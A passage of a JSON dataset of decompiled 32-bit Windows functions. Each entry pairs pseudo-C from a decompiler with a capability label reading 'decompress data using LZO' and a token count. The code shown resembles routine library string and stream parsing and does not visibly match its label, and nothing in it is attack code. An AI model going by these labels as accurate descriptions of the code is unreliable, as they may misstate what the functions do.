== 0xffffffff) && (arg_8h != NULL)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                uVar7 = *arg_8h[2];\n                goto code_r0x0045a9c5;\n            }\n            pcVar1 = *(*arg_8h + 0x24);\n            puVar18 = puVar13 + -4;\n            puVar13 = puVar13 + -4;\n            *puVar18 = 0x45abf6;\n            uVar7 = (*pcVar1)();\n            if (uVar7 != 0xffffffff) goto code_r0x0045a9c5;\n            arg_8h = NULL;\n            var_2dh._0_1_ = -1;\n        }\n        else {\ncode_r0x0045a9c5:\n            var_2dh._0_1_ = uVar7;\n        }\n        if (ppiVar19 == NULL) goto code_r0x0045ab33;\n        ppiVar10 = NULL;\n        var_1ch = ppiVar20;\n        stack0xffffffd0 = NULL;\n        var_20h = var_34h;\n        do {\n            while( true ) {\n                ppiVar9 = var_34h + ppiVar10;\n                if (ppiVar20 <= *ppiVar9 && *ppiVar9 != ppiVar20) break;\n                stack0xffffffd0 = stack0xffffffd0 + 1;\ncode_r0x0045a9e9:\n                ppiVar10 = ppiVar10 + 1;\n                if (ppiVar19 <= ppiVar10) goto code_r0x0045aa38;\n            }\n            var_24h = var_28h + ppiVar10;\n            if (*(*(arg_1ch + *var_24h * 4) + ppiVar20) == var_2dh) goto code_r0x0045a9e9;\n            ppiVar19 = ppiVar19 + -1;\n            *var_24h = var_28h[ppiVar19];\n            *ppiVar9 = var_34h[ppiVar19];\n        } while (ppiVar10 < ppiVar19);\ncode_r0x0045aa38:\n        if (stack0xffffffd0 == ppiVar19) break;\n        if (arg_8h[2] < arg_8h[3]) {\n            arg_8h[2] = arg_8h[2] + 1;\n        }\n        else {\n            pcVar1 = *(*arg_8h + 0x28);\n            puVar15 = puVar13 + -4;\n            puVar13 = puVar13 + -4;\n            *puVar15 = 0x45ab15;\n            (*pcVar1)();\n        }\n        ppiVar20 = ppiVar20 + 1;\n        arg_ch = 0xffffffff;\n        bVar11 = arg_8h != NULL;\n        var_20h._0_1_ = 1;\n        if (bVar11) {\ncode_r0x0045aa7d:\n            var_20h._0_1_ = 0;\n            if (arg_8h[3] <= arg_8h[2]) {\n                var_1ch = var_1ch & 0xffffff00;\n                pcVar1 = *(*arg_8h + 0x24);\n                puVar12 = puVar13 + -4;\n                puVar13 = puVar13 + -4;\n                *puVar12 = 0x45aa93;\n                iVar6 = (*pcVar1)();\n                var_20h._0_1_ = var_1ch;\n                if (iVar6 == -1) {\n                    arg_8h = NULL;\n                    var_20h._0_1_ = bVar11;\n                }\n            }\n        }\n    }\n    if (ppiVar19 == 0x1) {\n        var_34h = *var_34h;\n    }\n    else {\n        if (ppiVar19 != 0x2) goto code_r0x0045ab33;\n        if (*var_34h == ppiVar20) goto code_r0x0045ab50;\n        var_34h = var_34h[1];\n    }\n    if (var_34h == ppiVar20) {\ncode_r0x0045ab50:\n        piVar8 = *var_28h;\n        if (arg_20h <= piVar8) {\n            piVar8 = piVar8 - arg_20h;\n        }\n        *arg_18h = piVar8;\n        return CONCAT44(arg_ch, arg_8h);\n    }\ncode_r0x0045ab33:\n    *arg_28h = *arg_28h | 4;\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 2788
    },
    "0045bed0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint64_t __cdecl\nfcn.0045bed0(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint noname_3, int32_t *arg_18h, int32_t arg_1ch, \n            int32_t arg_20h, int32_t arg_24h, uint32_t *arg_28h)\n\n{\n    int16_t iVar1;\n    code *pcVar2;\n    char cVar3;\n    uint16_t uVar4;\n    uint16_t uVar5;\n    int16_t iVar6;\n    int16_t iVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    int32_t *piVar12;\n    int32_t *piVar13;\n    uint32_t *puVar14;\n    uint32_t *puVar15;\n    uint *puVar16;\n    int32_t *piVar17;\n    int32_t iVar19;\n    int32_t *piVar20;\n    uint uStack68;\n    int32_t aiStack64 [5];\n    int32_t *var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t *var_1ch;\n    uint var_ch;\n    uint *puVar18;\n    \n    aiStack64[1] = arg_24h + 0x6c;\n    aiStack64[0] = 0x45bee7;\n    var_1ch = fcn.004a0ae0();\n    aiStack64[0] = 0x45beff;\n    iVar8 = fcn.00418950();\n    iVar8 = -iVar8;\n    *(&stack0xffffffc4 + iVar8) = &fcn.0045bed0::arg_10h;\n    *(&stack0xffffffc0 + iVar8) = 0x45bf16;\n    cVar3 = fcn.00430e20();\n    iVar1 = arg_ch;\n    if (cVar3 == '\\0') {\n        *(&stack0xffffffbc + iVar8) = 0x45bf3f;\n        uVar4 = fcn.00430ec0();\n        if (arg_20h != 0) {\n            var_20h = &fcn.0045bed0::var_28h + iVar8 + 3 & 0xfffffff0;\n            iVar19 = 0;\n            piVar20 = NULL;\n            iVar11 = arg_1ch;\n            puVar15 = &stack0xffffffc0 + iVar8;\n            do {\n                while (uVar5 = **(iVar11 + iVar19 * 4),  uVar5 == uVar4) {\ncode_r0x0045bf82:\n                    var_20h[piVar20] = iVar19;\n                    piVar20 = piVar20 + 1;\n                    iVar19 = iVar19 + 1;\n                    piVar17 = puVar15;\n                    if (arg_20h == iVar19) goto code_r0x0045bf93;\n                }\n                iVar8 = *var_1ch;\n                *puVar15 = uVar5;\n                pcVar2 = *(iVar8 + 0x18);\n                puVar14 = puVar15 + -1;\n                puVar15[-1] = 0x45bf64;\n                arg_1ch = iVar11;\n                uVar5 = (*pcVar2)();\n                puVar15 = puVar14 + -4;\n                piVar17 = puVar14 + -4;\n                iVar11 = arg_1ch;\n                if (uVar4 == uVar5) goto code_r0x0045bf82;\n                iVar19 = iVar19 + 1;\n                puVar15 = puVar14 + -4;\n            } while (arg_20h != iVar19);\ncode_r0x0045bf93:\n            piVar12 = var_20h;\n            var_20h = NULL;\n            if (0x1 < piVar20) {\ncode_r0x0045bfb0:\n                iVar8 = *piVar12;\n                var_28h = piVar12;\n                *piVar17 = *(arg_1ch + iVar8 * 4);\n                piVar17[-1] = 0x45bfc3;\n                uVar9 = sub.msvcrt.dll_wcslen();\n                piVar12 = var_28h;\n                var_1ch = piVar20;\n                var_24h = iVar8;\n                piVar13 = 0x1;\n                do {\n                    *piVar17 = *(arg_1ch + piVar12[piVar13] * 4);\n                    piVar17[-1] = 0x45bff1;\n                    uVar10 = sub.msvcrt.dll_wcslen();\n                    piVar20 = var_1ch;\n                    iVar8 = var_24h;\n                    if (uVar10 < uVar9) {\n                        uVar9 = uVar10;\n                    }\n                    piVar13 = piVar13 + 1;\n                } while (piVar13 < var_1ch);\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 2;\n                }\n                else {\n                    var_1ch = piVar12;\n                    pcVar2 = *(*arg_8h + 0x28);\n                    puVar18 = piVar17 + -1;\n                    piVar17 = piVar17 + -1;\n                    *puVar18 = 0x45c17a;\n                    (*pcVar2)();\n                    piVar12 = var_1ch;\n                }\n                var_20h = var_20h + 1;\n                var_24h = piVar12;\n                arg_ch._0_2_ = -1;\n                iVar1 = -1;\n                if (var_20h < uVar9) {\n                    *piVar17 = &fcn.0045bed0::arg_10h;\n                    piVar17[-1] = 0x45c046;\n                    cVar3 = fcn.00430e20();\n                    piVar17 = piVar17 + -1;\n                    iVar1 = -1;\n                    if (cVar3 == '\\0') {\n                        piVar13 = NULL;\n                        var_1ch = var_20h * 2;\n                        piVar12 = var_24h;\n                        do {\n                            iVar1 = *(*(arg_1ch + iVar8 * 4) + var_1ch);\n                            iVar7 = arg_ch;\n                            if (arg_8h != NULL) {\n                                if (arg_8h[2] < arg_8h[3]) {\n                                    iVar7 = *arg_8h[2];\n                                }\n                                else {\n                                    var_24h = piVar12;\n                                    pcVar2 = *(*arg_8h + 0x24);\n                                    puVar16 = piVar17 + -4;\n                                    piVar17 = piVar17 + -4;\n                                    *puVar16 = 0x45c16d;\n                                    iVar7 = (*pcVar2)();\n                                    piVar12 = var_24h;\n                                }\n                                if (iVar7 == -1) {\n                                    arg_8h = NULL;\n                                }\n                            }\n                            if (iVar1 == iVar7) {\n                                piVar13 = piVar13 + 1;\n                                if (piVar20 <= piVar13) goto code_r0x0045c09e;\n                            }\n                            else {\n                                piVar20 = piVar20 + -1;\n                                piVar12[piVar13] = piVar12[piVar20];\n                                if (piVar20 <= piVar13) goto code_r0x0045c09e;\n                            }\n                            iVar8 = piVar12[piVar13];\n                        } while( true );\n                    }\n                }\n                goto code_r0x0045bf1d;\n            }\ncode_r0x0045c0a9:\n            iVar1 = arg_ch;\n            if (piVar20 == 0x1) {\n                piVar17[-1] = 0x45c0ba;\n                fcn.004867f0();\n                uVar9 = var_20h;\n                var_20h = *piVar12;\n                uVar9 = uVar9 + 1;\n                iVar8 = *(arg_1ch + *piVar12 * 4);\n                *piVar17 = iVar8;\n                piVar17[-1] = 0x45c0dc;\n                var_1ch = sub.msvcrt.dll_wcslen();\n                piVar20 = piVar17;\n                if (uVar9 < var_1ch) {\n                    do {\n                        *piVar20 = &fcn.0045bed0::arg_10h;\n                        piVar20[-1] = 0x45c0f1;\n                        cVar3 = fcn.00430e20();\n                        iVar1 = -1;\n                        if (cVar3 != '\\0') goto code_r0x0045bf1d;\n                        iVar7 = *(iVar8 + uVar9 * 2);\n                        piVar20[-2] = 0x45c10c;\n                        iVar6 = fcn.00430ec0();\n                        iVar1 = -1;\n                        if (iVar7 != iVar6) goto code_r0x0045bf1d;\n                        uVar9 = uVar9 + 1;\n                        piVar20[-2] = 0x45c120;\n                        fcn.004867f0();\n                        piVar20 = piVar20 + -1;\n                    } while (uVar9 < var_1ch);\n                }\n                iVar1 = -1;\n                if (var_1ch == uVar9) {\n                    *arg_18h = var_20h;\n                    goto code_r0x0045bf23;\n                }\n            }\n        }\n    }\ncode_r0x0045bf1d:\n    *arg_28h = *arg_28h | 4;\ncode_r0x0045bf23:\n    return CONCAT24(iVar1, arg_8h);\ncode_r0x0045c09e:\n    if (piVar20 < 0x2) goto code_r0x0045c0a9;\n    goto code_r0x0045bfb0;\n}\n",
        "token_count": 2298
    },
    "0045d910": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t __cdecl\nfcn.0045d910(int32_t *arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h, uint32_t *arg_18h, int32_t arg_1ch, \n            uint32_t arg_20h, int32_t arg_24h, uint32_t *arg_28h)\n\n{\n    uint16_t uVar1;\n    code *pcVar2;\n    uint uVar3;\n    char cVar4;\n    bool bVar5;\n    ushort uVar6;\n    int16_t iVar7;\n    int32_t *piVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t iVar11;\n    uint *puVar12;\n    uint32_t *puVar13;\n    uint32_t *puVar14;\n    uchar *puVar15;\n    uchar *puVar16;\n    uint *puVar18;\n    uint *puVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint32_t *puVar22;\n    uint8_t uVar23;\n    ulong uVar24;\n    uint uStack84;\n    int32_t aiStack80 [5];\n    uchar uStack57;\n    int32_t var_34h;\n    uint32_t var_2eh;\n    uint32_t *var_28h;\n    uint32_t *var_24h;\n    uint32_t var_20h;\n    uint32_t *var_1ch;\n    uint var_ch;\n    uint *puVar17;\n    \n    aiStack80[1] = arg_24h + 0x6c;\n    aiStack80[0] = 0x45d927;\n    piVar8 = fcn.004a0ae0();\n    aiStack80[0] = 0x45d93e;\n    iVar9 = fcn.00418950();\n    iVar9 = -iVar9;\n    var_24h = &stack0xffffffc7 + iVar9 & 0xfffffff0;\n    *(&stack0xffffffb4 + iVar9) = &fcn.0045d910::arg_10h;\n    *(&stack0xffffffb0 + iVar9) = 0x45d958;\n    cVar4 = fcn.00430e20();\n    if (cVar4 == '\\0') {\n        uVar10 = 0;\n        uVar21 = 0;\n        *(&stack0xffffffac + iVar9) = 0x45dba3;\n        uVar6 = fcn.00430ec0();\n        var_1ch = CONCAT22(var_1ch._2_2_, uVar6);\n        uVar20 = arg_20h * 2;\n        var_20h = uVar20;\n        iVar11 = arg_1ch;\n        puVar14 = &stack0xffffffb0 + iVar9;\n        if (uVar20 == 0) {\n            puVar16 = &stack0xffffffb0 + iVar9;\n            puVar14 = NULL;\n        }\n        else {\n            do {\n                while( true ) {\n                    uVar1 = **(iVar11 + uVar10 * 4);\n                    if (uVar1 != var_1ch) break;\ncode_r0x0045dbed:\n                    var_24h[uVar21] = uVar10;\n                    uVar21 = uVar21 + 1;\n                    uVar10 = uVar10 + 1;\n                    puVar15 = puVar14;\n                    uVar20 = uVar21;\n                    if (uVar10 == var_20h) goto code_r0x0045dbfe;\n                }\n                iVar9 = *piVar8;\n                *puVar14 = uVar1;\n                pcVar2 = *(iVar9 + 0x18);\n                puVar13 = puVar14 + -1;\n                puVar14[-1] = 0x45dbcd;\n                arg_1ch = iVar11;\n                iVar7 = (*pcVar2)();\n                puVar14 = puVar13 + -4;\n                puVar15 = puVar13 + -4;\n                iVar11 = arg_1ch;\n                if (var_1ch == iVar7) goto code_r0x0045dbed;\n                uVar10 = uVar10 + 1;\n                puVar14 = puVar13 + -4;\n                uVar20 = uVar21;\n            } while (uVar10 != var_20h);\ncode_r0x0045dbfe:\n            var_20h = 0;\n            puVar16 = puVar15;\n            puVar14 = NULL;\n            if (uVar20 != 0) {\n                *(puVar15 + -4) = 0x45dc17;\n                fcn.004867f0();\n                *(puVar15 + -4) = 0x45dc35;\n                uVar24 = fcn.00418950();\n                iVar11 = arg_1ch;\n                iVar9 = -uVar24;\n                puVar16 = puVar15 + iVar9;\n                var_20h = uVar20;\n                var_28h = puVar15 + iVar9 + 0x13 & 0xfffffff0;\n                var_1ch = (uVar24 >> 0x20) + var_24h;\n                puVar14 = var_24h;\n                puVar22 = puVar15 + iVar9 + 0x13 & 0xfffffff0;\n                do {\n                    arg_ch = 0xffff;\n                    uVar20 = *puVar14;\n                    puVar14 = puVar14 + 1;\n                    *(puVar15 + iVar9) = *(iVar11 + uVar20 * 4);\n                    *(puVar15 + iVar9 + -4) = 0x45dc66;\n                    uVar10 = sub.msvcrt.dll_wcslen();\n                    uVar20 = var_20h;\n                    *puVar22 = uVar10;\n                    puVar22 = puVar22 + 1;\n                } while (var_1ch != puVar14);\n                var_20h = 1;\n                puVar14 = var_28h;\n            }\n        }\n    }\n    else {\n        var_20h = 0;\n        uVar20 = 0;\n        puVar16 = &stack0xffffffb0 + iVar9;\n        puVar14 = NULL;\n    }\n    uVar23 = arg_ch == -1;\n    var_1ch._0_1_ = arg_8h != NULL && uVar23;\n    uVar3 = arg_ch;\n    if (var_1ch) goto code_r0x0045da93;\n    while( true ) {\n        arg_ch._0_2_ = uVar3;\n        var_1ch._0_1_ = arg_14h == -1;\n        bVar5 = arg_10h != NULL && var_1ch;\n        var_1ch = var_1ch & 0xffffff00 | bVar5;\n        if (bVar5) {\n            if (arg_10h[2] < arg_10h[3]) {\n                iVar7 = *arg_10h[2];\n            }\n            else {\n                pcVar2 = *(*arg_10h + 0x24);\n                puVar17 = puVar16 + -4;\n                puVar16 = puVar16 + -4;\n                *puVar17 = 0x45dc88;\n                iVar7 = (*pcVar2)();\n            }\n            var_1ch._0_1_ = 0;\n            if (iVar7 == -1) {\n                arg_10h = NULL;\n            }\n        }\n        if (uVar23 == var_1ch) break;\n        var_2eh._0_2_ = arg_ch;\n        if ((arg_ch == -1) && (arg_8h != NULL)) {\n            if (arg_8h[2] < arg_8h[3]) {\n                var_2eh._0_2_ = *arg_8h[2];\n            }\n            else {\n                pcVar2 = *(*arg_8h + 0x24);\n                puVar19 = puVar16 + -4;\n                puVar16 = puVar16 + -4;\n                *puVar19 = 0x45dca3;\n                var_2eh._0_2_ = (*pcVar2)();\n            }\n            if (var_2eh == -1) {\n                arg_8h = NULL;\n            }\n        }\n        if (uVar20 == 0) goto code_r0x0045db0a;\n        uVar10 = 0;\n        var_1ch = puVar14;\n        puVar14 = var_1ch;\n        stack0xffffffd0 = 0;\n        var_34h = var_20h * 2;\n        do {\n            while( true ) {\n                puVar22 = puVar14 + uVar10;\n                if (var_20h <= *puVar22 && *puVar22 != var_20h) break;\n                stack0xffffffd0 = stack0xffffffd0 + 1;\ncode_r0x0045d9f7:\n                uVar10 = uVar10 + 1;\n                if (uVar20 <= uVar10) goto code_r0x0045da4a;\n            }\n            var_28h = var_24h + uVar10;\n            if (*(*(arg_1ch + *var_28h * 4) + var_20h * 2) == var_2eh) goto code_r0x0045d9f7;\n            uVar20 = uVar20 - 1;\n            *var_28h = var_24h[uVar20];\n            *puVar22 = puVar14[uVar20];\n        } while (uVar10 < uVar20);\ncode_r0x0045da4a:\n        if (stack0xffffffd0 == uVar20) break;\n        if (arg_8h[2] < arg_8h[3]) {\n            arg_8h[2] = arg_8h[2] + 2;\n        }\n        else {\n            pcVar2 = *(*arg_8h + 0x28);\n            puVar12 = puVar16 + -4;\n            puVar16 = puVar16 + -4;\n            *puVar12 = 0x45db55;\n            (*pcVar2)();\n        }\n        var_20h = var_20h + 1;\n        arg_ch = 0xffff;\n        var_1ch._0_1_ = arg_8h != NULL;\n        uVar23 = 1;\n        uVar3 = 0xffff;\n        if (var_1ch) {\ncode_r0x0045da93:\n            if (arg_8h[2] < arg_8h[3]) {\n                iVar7 = *arg_8h[2];\n            }\n            else {\n                var_1ch = var_1ch & 0xffffff00 | var_1ch;\n                pcVar2 = *(*arg_8h + 0x24);\n                puVar18 = puVar16 + -4;\n                puVar16 = puVar16 + -4;\n                *puVar18 = 0x45dc95;\n                iVar7 = (*pcVar2)();\n            }\n            uVar23 = 0;\n            uVar3 = arg_ch;\n            if (iVar7 == -1) {\n                arg_8h = NULL;\n                uVar23 = var_1ch;\n            }\n        }\n    }\n    if (uVar20 == 1) {\n        uVar20 = *puVar14;\n    }\n    else {\n        if (uVar20 != 2) goto code_r0x0045db0a;\n        if (*puVar14 == var_20h) goto code_r0x0045db6e;\n        uVar20 = puVar14[1];\n    }\n    if (uVar20 == var_20h) {\ncode_r0x0045db6e:\n        uVar20 = *var_24h;\n        if (arg_20h <= uVar20) {\n            uVar20 = uVar20 - arg_20h;\n        }\n        *arg_18h = uVar20;\n        return CONCAT24(arg_ch, arg_8h);\n    }\ncode_r0x0045db0a:\n    *arg_28h = *arg_28h | 4;\n    return CONCAT44(uVar3, arg_8h);\n}\n",
        "token_count": 2786
    },
    "0045f0a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffe0 : 0x0045f167\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x0045f76b)\n// WARNING: Removing unreachable block (ram,0x0045f1f7)\n// WARNING: Removing unreachable block (ram,0x0045f1ff)\n// WARNING: Removing unreachable block (ram,0x0045f216)\n// WARNING: Removing unreachable block (ram,0x0045f1d0)\n// WARNING: Removing unreachable block (ram,0x0045f221)\n// WARNING: Removing unreachable block (ram,0x0045f1d6)\n// WARNING: Removing unreachable block (ram,0x0045f1b3)\n// WARNING: Removing unreachable block (ram,0x0045f1bd)\n// WARNING: Removing unreachable block (ram,0x0045f5ca)\n// WARNING: Removing unreachable block (ram,0x0045f630)\n// WARNING: Removing unreachable block (ram,0x0045f1c3)\n// WARNING: Removing unreachable block (ram,0x0045f1e0)\n// WARNING: Removing unreachable block (ram,0x0045f730)\n// WARNING: Removing unreachable block (ram,0x0045f739)\n// WARNING: Removing unreachable block (ram,0x0045f91c)\n// WARNING: Removing unreachable block (ram,0x0045f930)\n// WARNING: Removing unreachable block (ram,0x0045f800)\n// WARNING: Removing unreachable block (ram,0x0045f5cd)\n// WARNING: Removing unreachable block (ram,0x0045f80f)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl\nfcn.0045f0a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_36h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_27h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar2 = arg_18h + 0x6c;\n    fcn.004a0a80(iVar2);\n    iVar2 = fcn.0042e5f0(iVar2);\n    *NULL = fcn.0046ba90(0, 0, &var_1ch);\n    if (*(iVar2 + 0x10) != '\\0') {\n        fcn.0046d280(0x20);\n    }\n    var_20h = fcn.0046ba90(0, 0, &var_27h + 1);\n    fcn.0046d280(0x20);\n    var_3ch = 1;\n    var_1ch = *(iVar2 + 0x34);\n    puVar3 = &var_1ch;\n    while( true ) {\n        if (var_1ch < 5) {\n    // WARNING: Could not recover jumptable at 0x0045f18c. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x502db0\n            uVar5 = (**(*puVar3 * 4 + 0x502db0))();\n            return uVar5;\n        }\n        if (3 < var_3ch) break;\n        puVar3 = &var_1ch + var_3ch;\n        var_1ch._0_1_ = *puVar3;\n        var_3ch = var_3ch + 1;\n    }\n    if ((1 < *(var_20h + -0xc)) && (iVar4 = fcn.0042c940(0x30, 0),  iVar4 != 0)) {\n        if (iVar4 == -1) {\n            iVar4 = *(var_20h + -0xc) + -1;\n        }\n        fcn.0046c2f0(0, iVar4);\n    }\n    if (*(stack0xffffffd8 + -0xc) != 0) {\n        fcn.0046d560(0);\n        cVar1 = fcn.0049e880(*(iVar2 + 8), *(iVar2 + 0xc), &var_27h + 3);\n        if (cVar1 == '\\0') {\n            *arg_1ch = *arg_1ch | 4;\n        }\n    }\n    fcn.0046c1d0(&var_20h);\n    cVar1 = fcn.00430ce0(&arg_10h);\n    if (cVar1 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0046bf80(&var_27h + 2);\n    fcn.0046bf80(&var_27h + 2);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 1223
    },
    "0045f9d0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Heritage AFTER dead removal. Example location: s0xffffffe0 : 0x0045fa97\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Removing unreachable block (ram,0x0046009b)\n// WARNING: Removing unreachable block (ram,0x0045fb27)\n// WARNING: Removing unreachable block (ram,0x0045fb2f)\n// WARNING: Removing unreachable block (ram,0x0045fb46)\n// WARNING: Removing unreachable block (ram,0x0045fb00)\n// WARNING: Removing unreachable block (ram,0x0045fb51)\n// WARNING: Removing unreachable block (ram,0x0045fb06)\n// WARNING: Removing unreachable block (ram,0x0045fae3)\n// WARNING: Removing unreachable block (ram,0x0045faed)\n// WARNING: Removing unreachable block (ram,0x0045fefa)\n// WARNING: Removing unreachable block (ram,0x0045ff60)\n// WARNING: Removing unreachable block (ram,0x0045faf3)\n// WARNING: Removing unreachable block (ram,0x0045fb10)\n// WARNING: Removing unreachable block (ram,0x00460060)\n// WARNING: Removing unreachable block (ram,0x00460069)\n// WARNING: Removing unreachable block (ram,0x0046024c)\n// WARNING: Removing unreachable block (ram,0x00460260)\n// WARNING: Removing unreachable block (ram,0x00460130)\n// WARNING: Removing unreachable block (ram,0x0045fefd)\n// WARNING: Removing unreachable block (ram,0x0046013f)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nulong __cdecl\nfcn.0045f9d0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint32_t *arg_1ch, uint arg_20h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    int32_t var_3ch;\n    uint var_36h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_27h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_ch;\n    \n    iVar2 = arg_18h + 0x6c;\n    fcn.004a0a80(iVar2);\n    iVar2 = fcn.0042e700(iVar2);\n    *NULL = fcn.0046ba90(0, 0, &var_1ch);\n    if (*(iVar2 + 0x10) != '\\0') {\n        fcn.0046d280(0x20);\n    }\n    var_20h = fcn.0046ba90(0, 0, &var_27h + 1);\n    fcn.0046d280(0x20);\n    var_3ch = 1;\n    var_1ch = *(iVar2 + 0x34);\n    puVar3 = &var_1ch;\n    while( true ) {\n        if (var_1ch < 5) {\n    // WARNING: Could not recover jumptable at 0x0045fabc. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (5 cases) at 0x502d9c\n            uVar5 = (**(*puVar3 * 4 + 0x502d9c))();\n            return uVar5;\n        }\n        if (3 < var_3ch) break;\n        puVar3 = &var_1ch + var_3ch;\n        var_1ch._0_1_ = *puVar3;\n        var_3ch = var_3ch + 1;\n    }\n    if ((1 < *(var_20h + -0xc)) && (iVar4 = fcn.0042c940(0x30, 0),  iVar4 != 0)) {\n        if (iVar4 == -1) {\n            iVar4 = *(var_20h + -0xc) + -1;\n        }\n        fcn.0046c2f0(0, iVar4);\n    }\n    if (*(stack0xffffffd8 + -0xc) != 0) {\n        fcn.0046d560(0);\n        cVar1 = fcn.0049e880(*(iVar2 + 8), *(iVar2 + 0xc), &var_27h + 3);\n        if (cVar1 == '\\0') {\n            *arg_1ch = *arg_1ch | 4;\n        }\n    }\n    fcn.0046c1d0(&var_20h);\n    cVar1 = fcn.00430ce0(&arg_10h);\n    if (cVar1 != '\\0') {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    fcn.0046bf80(&var_27h + 2);\n    fcn.0046bf80(&var_27h + 2);\n    return CONCAT44(arg_ch, arg_8h);\n}\n",
        "token_count": 1201
    },
    "00460320": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nulong __cdecl\nfcn.00460320(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            int32_t *arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    ulong uVar5;\n    uint var_2ch;\n    int32_t var_1dh;\n    uint var_bp_ch;\n    \n    piVar3 = fcn.004a0a80(arg_1ch + 0x6c);\n    *NULL = fcn.0046ba90(0, 0, &var_1dh);\n    if (arg_18h == '\\0') {\n        uVar5 = fcn.0045f0a0(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_1dh + 1);\n    }\n    else {\n        uVar5 = fcn.0045f9d0(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_1dh + 1);\n    }\n    iVar1 = *(stack0xffffffe0 + -0xc);\n    if (iVar1 != 0) {\n        fcn.0046cce0(iVar1, 0);\n        iVar4 = *arg_24h;\n        if (-1 < *(iVar4 + -4)) {\n            fcn.0046ba50();\n            iVar4 = *arg_24h;\n        }\n        iVar2 = stack0xffffffe0;\n        if (*(piVar3 + 7) != '\\x01') {\n            if (*(piVar3 + 7) == '\\0') {\n                fcn.00431cc0();\n            }\n            if (*(*piVar3 + 0x1c) != 0x431f40) {\n                (**(*piVar3 + 0x1c))(iVar2, iVar1 + iVar2, iVar4);\n                goto code_r0x00460414;\n            }\n        }\n        sub.msvcrt.dll_memcpy(iVar4, iVar2, iVar1);\n    }\ncode_r0x00460414:\n    if (*0x4f59f4 == 0) {\n        iVar1 = *(stack0xffffffe0 + -4);\n        *(stack0xffffffe0 + -4) = iVar1 + -1;\n    }\n    else {\n        LOCK();\n        piVar3 = stack0xffffffe0 + -4;\n        iVar1 = *piVar3;\n        *piVar3 = *piVar3 + -1;\n    }\n    if (0 < iVar1) {\n        return uVar5;\n    }\n    fcn.0046bf60(&var_1dh);\n    return uVar5;\n}\n",
        "token_count": 663
    },
    "004604e0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nulong __cdecl\nfcn.004604e0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_20h;\n    uint var_1ch;\n    uint var_bp_ch;\n    \n    var_20h = fcn.0046ba90(0, 0, &var_1ch);\n    if (arg_18h == '\\0') {\n        uVar3 = fcn.0045f0a0(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_20h);\n    }\n    else {\n        uVar3 = fcn.0045f9d0(arg_8h, arg_ch, arg_10h, arg_14h, arg_1ch, arg_20h, &var_20h);\n    }\n    var_1ch = fcn.0048f260();\n    fcn.0049dd30(var_20h, arg_24h, arg_20h, &var_1ch);\n    if (*0x4f59f4 == 0) {\n        iVar2 = *(var_20h + -4);\n        *(var_20h + -4) = iVar2 + -1;\n    }\n    else {\n        LOCK();\n        piVar1 = var_20h + 